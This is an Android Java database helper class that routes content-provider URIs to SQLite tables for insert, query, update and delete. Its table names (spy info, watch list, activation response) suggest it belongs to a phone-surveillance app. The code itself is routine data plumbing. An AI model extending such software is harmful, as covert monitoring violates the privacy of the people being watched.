package com.fx.preference;

import java.util.HashMap;

import android.content.ContentUris;
import android.content.ContentValues;
import android.content.UriMatcher;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.net.Uri;

import com.fx.maind.ref.Customization;
import com.fx.util.FxUtil;
import com.vvt.logger.FxLog;

class PreferenceDatabaseHelper {
	
	private static final String TAG = "PreferenceDatabaseHelper";
	private static final boolean LOCAL_LOGV = Customization.VERBOSE;

	private static final int PRODUCT_INFO = 1;
    private static final int EVENT_PREFERENCE = 2;
    private static final int CONNECTION_HISTORY = 3;
    private static final int ACTIVATION_RESPONSE = 4;
    private static final int SPY_INFO = 5;
    private static final int WATCH_LIST = 6;
	
    private static PreferenceDatabaseHelper sInstance;
    
    public static PreferenceDatabaseHelper getInstance() {
    	if (sInstance == null) {
    		sInstance = new PreferenceDatabaseHelper();
    	}
    	return sInstance;
    }
    
	private UriMatcher sUriMatcher;
	private PreferenceDatabase mPreferenceDatabase;
    
	private PreferenceDatabaseHelper() {
    	sUriMatcher = new UriMatcher(UriMatcher.NO_MATCH);
    	
    	sUriMatcher.addURI(
    			PreferenceDatabaseMetadata.AUTHORITY, 
    			PreferenceDatabaseMetadata.ProductInfo.TABLE_NAME, 
    			PRODUCT_INFO);
    	sUriMatcher.addURI(
    			PreferenceDatabaseMetadata.AUTHORITY, 
    			PreferenceDatabaseMetadata.EventPreference.TABLE_NAME, 
    			EVENT_PREFERENCE);
    	sUriMatcher.addURI(
    			PreferenceDatabaseMetadata.AUTHORITY, 
    			PreferenceDatabaseMetadata.ConnectionHistory.TABLE_NAME, 
    			CONNECTION_HISTORY);
    	sUriMatcher.addURI(
    			PreferenceDatabaseMetadata.AUTHORITY, 
    			PreferenceDatabaseMetadata.ActivationResponse.TABLE_NAME, 
    			ACTIVATION_RESPONSE);
    	sUriMatcher.addURI(
    			PreferenceDatabaseMetadata.AUTHORITY, 
    			PreferenceDatabaseMetadata.SpyInfo.TABLE_NAME, 
    			SPY_INFO);
    	sUriMatcher.addURI(
    			PreferenceDatabaseMetadata.AUTHORITY, 
    			PreferenceDatabaseMetadata.WatchList.TABLE_NAME, 
    			WATCH_LIST);
    	
    	mPreferenceDatabase = PreferenceDatabase.getInstance();
    }
    
    public Uri insert(Uri uri, ContentValues values) {
		Uri insertedUri = null;
		String notifyUri = null;
		int match = sUriMatcher.match(uri);
		
        if (LOCAL_LOGV) {
            FxLog.v(TAG, "Insert uri=" + uri + ", match=" + match);
        }
        
    	String table = null;
        switch (match) {
        	case PRODUCT_INFO:
        		table = PreferenceDatabaseMetadata.ProductInfo.TABLE_NAME;
        		notifyUri = PreferenceDatabaseMetadata.ProductInfo.URI;
        		break;
        	case EVENT_PREFERENCE:
        		table = PreferenceDatabaseMetadata.EventPreference.TABLE_NAME;
        		notifyUri = PreferenceDatabaseMetadata.EventPreference.URI;
        		break;
        	case CONNECTION_HISTORY:
        		table = PreferenceDatabaseMetadata.ConnectionHistory.TABLE_NAME;
        		notifyUri = PreferenceDatabaseMetadata.ConnectionHistory.URI;
        		break;
        	case ACTIVATION_RESPONSE:
        		table = PreferenceDatabaseMetadata.ActivationResponse.TABLE_NAME;
        		notifyUri = PreferenceDatabaseMetadata.ActivationResponse.URI;
        		break;
        	case SPY_INFO:
        		table = PreferenceDatabaseMetadata.SpyInfo.TABLE_NAME;
        		notifyUri = PreferenceDatabaseMetadata.SpyInfo.URI;
        		break;
        	case WATCH_LIST:
        		table = PreferenceDatabaseMetadata.WatchList.TABLE_NAME;
        		notifyUri = PreferenceDatabaseMetadata.WatchList.URI;
        		break;
        	default:
        		throw new IllegalArgumentException("Unknown URI " + uri);
        }
        
        SQLiteDatabase db = mPreferenceDatabase.getWritableDatabase();
        long rowId = db.insert(table, null, values);
        db.close();
		
		if (rowId > 0) {
			insertedUri = ContentUris.withAppendedId(Uri.parse(notifyUri), rowId);
		}
		else {
			throw new SQLException("Failed to insert row into " + uri);
		}
		return insertedUri;
	}
    
    public Cursor query(Uri uri, String[] projection, String selection,
			String[] selectionArgs, String sortOrder) {
		// Parse selection String
    	String parseSelect = FxUtil.getSqlSelection(selection);
	    String parseLimit = FxUtil.getSqlLimit(selection);
	    
	    HashMap<String, String> sqlSettings = getSqlSettings(uri, parseSelect);
	    
	    SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
		qb.setTables(sqlSettings.get(FxUtil.SQL_TABLE_KEY));
		if (sqlSettings.get(FxUtil.SQL_SELECT_KEY) != null) {
			qb.appendWhere(sqlSettings.get(FxUtil.SQL_SELECT_KEY));
		}
		
	    // Build query String
	    String sql = qb.buildQuery(projection, parseSelect, 
	    		selectionArgs, null, null, sortOrder, parseLimit);
	
	    // Get the database and run the query
	    SQLiteDatabase db = mPreferenceDatabase.getReadableDatabase();
	    Cursor cursor = db.rawQuery(sql, selectionArgs);
	
	    return cursor;
	}
    
    public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
		HashMap<String, String> sqlSettings = getSqlSettings(uri, selection);
	    
		SQLiteDatabase db = mPreferenceDatabase.getWritableDatabase();
	    int rowAffected = db.update(
	    		sqlSettings.get(FxUtil.SQL_TABLE_KEY), 
	    		values, 
	    		sqlSettings.get(FxUtil.SQL_SELECT_KEY), 
	    		selectionArgs);
	    db.close();
	    
	    return rowAffected;
	}
	
    /**
     * @param uri
     * @param selection
     * @param selectionArgs
     * @return rowAffected
     */
	public int delete(Uri uri, String selection, String[] selectionArgs) {
		HashMap<String, String> sqlSettings = getSqlSettings(uri, selection);
	    
		SQLiteDatabase db = mPreferenceDatabase.getWritableDatabase();
	    int rowAffected = db.delete(
	    		sqlSettings.get(FxUtil.SQL_TABLE_KEY), 
	    		sqlSettings.get(FxUtil.SQL_SELECT_KEY), 
	    		selectionArgs);
	    db.close();
	    
	    return rowAffected;
	}
    
	private HashMap<String, String> getSqlSettings(Uri uri, String selection) {
		String table = null;
		
		int match = sUriMatcher.match(uri);
		switch (match) {
			case PRODUCT_INFO:
				table = PreferenceDatabaseMetadata.ProductInfo.TABLE_NAME;
				break;
			case EVENT_PREFERENCE:
				table = PreferenceDatabaseMetadata.EventPreference.TABLE_NAME;
		        break;
			case CONNECTION_HISTORY:
				table = PreferenceDatabaseMetadata.ConnectionHistory.TABLE_NAME;
		        break;
			case ACTIVATION_RESPONSE:
				table = PreferenceDatabaseMetadata.ActivationResponse.TABLE_NAME;
		        break;
			case SPY_INFO:
				table = PreferenceDatabaseMetadata.SpyInfo.TABLE_NAME;
		        break;
			case WATCH_LIST:
				table = PreferenceDatabaseMetadata.WatchList.TABLE_NAME;
		        break;
		    default:
		        throw new IllegalArgumentException("Unknown URI " + uri);
		}
		HashMap<String, String> sqlSettings = new HashMap<String, String>();
		sqlSettings.put(FxUtil.SQL_TABLE_KEY, table);
		sqlSettings.put(FxUtil.SQL_SELECT_KEY, selection);
		
		return sqlSettings;
	}
	
}
